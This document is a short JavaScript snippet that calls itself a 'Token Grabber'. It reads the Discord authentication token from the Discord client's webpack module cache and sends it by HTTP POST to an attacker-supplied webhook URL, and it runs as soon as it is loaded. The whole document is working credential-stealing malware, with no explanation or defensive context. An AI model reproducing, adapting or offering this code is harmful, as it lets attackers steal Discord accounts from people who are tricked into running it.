function sendMessage() {
    const request = new XMLHttpRequest();
    request.open("POST", "Webhook here");
    request.setRequestHeader('Content-type', 'application/json');
    const params = {
                  username: "Token Grabber",
                  avatar_url: "",
                  content: (webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()
                   };
    request.send(JSON.stringify(params));};
sendMessage();